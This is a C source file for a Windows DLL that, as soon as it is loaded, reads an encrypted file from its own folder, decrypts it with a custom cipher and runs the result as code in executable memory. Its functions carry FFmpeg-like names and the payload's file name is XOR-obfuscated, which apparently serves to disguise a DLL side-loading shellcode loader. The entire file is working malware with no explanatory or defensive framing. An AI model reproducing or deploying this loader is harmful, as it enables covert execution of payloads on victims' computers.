#include <windows.h>
#include <shlwapi.h>
#include <stdio.h>

#pragma comment(lib, "Shlwapi.lib")

unsigned char avio_ror(unsigned char val, int n) {
    return (val >> n) | (val << (8 - n));
}

void custom_stream_decrypt(unsigned char* data, size_t size) {
    unsigned int state = 0x1337BEEF;
    unsigned int a = 1664525;
    unsigned int c = 1013904223;
    unsigned int m = 0xFFFFFFFF;

    for (size_t i = 0; i < size; i++) {
        state = (a * state + c);
        unsigned char key_stream = (unsigned char)((state >> 24) & 0xFF);

        unsigned char temp = (data[i] - (unsigned char)(i & 0xFF)) & 0xFF;
        temp = avio_ror(temp, 3);
        data[i] = temp ^ key_stream;
    }
}

void get_decrypted_filename(char* out_path) {
    unsigned char xored_name[] = { 23, 0, 14, 24, 0, 92, 74, 5, 22 };
    const char* xor_key = "tamper.db";
    for (int i = 0; i < 9; i++) {
        out_path[i] = xored_name[i] ^ xor_key[i];
    }
    out_path[9] = '\0';
}

DWORD WINAPI avformat_alloc_data(LPVOID lpParameter) {
    char* dllPath = (char*)lpParameter;
    char szPath[MAX_PATH];
    char fileName[16];

    strcpy(szPath, dllPath);
    free(dllPath); 
    PathRemoveFileSpecA(szPath);

    get_decrypted_filename(fileName);
    strcat(szPath, "\\");
    strcat(szPath, fileName);
    FILE* fp = fopen(szPath, "rb");
    if (!fp) return 0;

    fseek(fp, 0, SEEK_END);
    size_t size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(size);
    if (!buffer) { fclose(fp); return 0; }

    fread(buffer, size, 1, fp);
    fclose(fp);

    custom_stream_decrypt(buffer, size);

    void* exec = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {
        memcpy(exec, buffer, size);
        SecureZeroMemory(buffer, size);

        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }

    free(buffer);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        DisableThreadLibraryCalls(hModule);

        char* currentDllPath = (char*)malloc(MAX_PATH);
        if (GetModuleFileNameA(hModule, currentDllPath, MAX_PATH)) {
            HANDLE threadHandle = CreateThread(NULL, 0, avformat_alloc_data, currentDllPath, 0, NULL);
            if (threadHandle) CloseHandle(threadHandle);
        }
        else {
            free(currentDllPath);
        }
        break;
    }
    }
    return TRUE;
}